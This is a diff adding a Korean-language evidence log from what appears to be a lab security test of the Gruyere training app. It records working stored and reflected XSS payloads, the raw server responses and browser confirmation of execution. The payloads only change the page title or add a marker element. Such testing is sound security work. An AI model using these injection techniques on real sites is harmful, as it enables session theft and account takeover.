@@ -1,0 +1,38 @@
+# Round 5 — XSS 3종 브라우저(CDP) 실행 증거 (전부 비인증/피해자 브라우저, 세션 gruyere-r5)
+
+## (a) 저장형 XSS — 프로필 icon 속성 탈출
+설정: GET /saveprofile?action=update&uid=brie&name=Brie&icon=<payload>
+payload: x' onerror='var d=document.createElement("div");d.id="icon-xss";d.textContent="ICON-XSS";document.body.appendChild(d)'
+서버 렌더 원문(비인증 홈): <img alt='' height='32' width='32' src='x' onerror='var d=document.createElement("div");d.id="icon-xss";d.textContent="ICON-XSS";document.body.appendChild(d)''>
+→ src='{{icon:text}}' 에서 cgi.escape 가 따옴표를 이스케이프하지 않아 작은따옴표로 속성 탈출
+CDP: 홈(/) 방문만으로 document.getElementById('icon-xss').textContent === "ICON-XSS"  ✅ 실행
+     (같은 페이지에서 Round 4 의 저장형 스니펫도 함께 실행돼 title="XSS-EXECUTED")
+
+## (b) 반사형 XSS — 잘못된 경로가 error.gtl 에 미이스케이프 반사
+URL: /<gid>/x%3Cscript%3Edocument.title%3D%27PATH-XSS%27%3C/script%3E
+응답 원문: <div class='message'>Invalid request: /x<script>document.title='PATH-XSS'</script></div>
+CDP: document.title === "PATH-XSS"  ✅ 실행 (클릭·상호작용 불필요)
+
+## (c) 반사형 XSS (AJAX) — feed.gtl?uid= 가 JS 문자열에 미이스케이프 삽입
+payload: x"] , document.title='FEED-XSS' , ["y
+서버 응답 원문:
+_feed((
+[
+"x"] , document.title='FEED-XSS' , ["y"
+]
+))
+(c1) 직접 문서로 로드하면 HTML 로 파싱되어 실행되지 않음(문자 그대로 표시) — **초기 예상이 틀렸던 지점**.
+     실행되려면 앱 자신의 eval 경로를 타야 한다: lib.js `_refresh()` 가 eval('('+text+')').
+CDP: /<gid>/snippets.gtl?uid=brie (lib.js 로드) 에서 _refresh('.../feed.gtl?uid=<payload>', cb) 호출
+     → document.title === "FEED-XSS"  ✅ 실행확인
+
+## (c2) 반사형 — Refresh 링크의 onclick 속성(단일인용부호) 안에 uid 가 삽입됨
+payload(작은따옴표 회피): x");document.title=String.fromCharCode(79,78,67,76,73,67,75,88,83,83);void("
+서버 렌더 onclick: _refreshSnippets("GID", "x");document.title=String.fromCharCode(...);void("")
+CDP: 앱 자체 Refresh 버튼을 클릭 → document.title === "ONCLICKXSS"  ✅ 실행확인
+※ 작은따옴표를 포함한 payload 를 쓰면 onclick 속성 자체가 끊겨(속성 탈출) 클릭 시 문법오류 → 실패했음.
+   속성이 단일인용부호로 감싸여 있으므로 payload 에 ' 를 쓰면 HTML 속성이, " 를 쓰면 JS 문자열이 먼저 깨진다.
+
+## (c3) 반사형 — uid 가 h2 HTML 문맥에 원문 삽입
+payload: zzz<img src=x onerror="document.title='UID-HTML-XSS'">
+CDP: /<gid>/snippets.gtl?uid=<payload> 로드만으로 document.title === "UID-HTML-XSS"  ✅ 실행
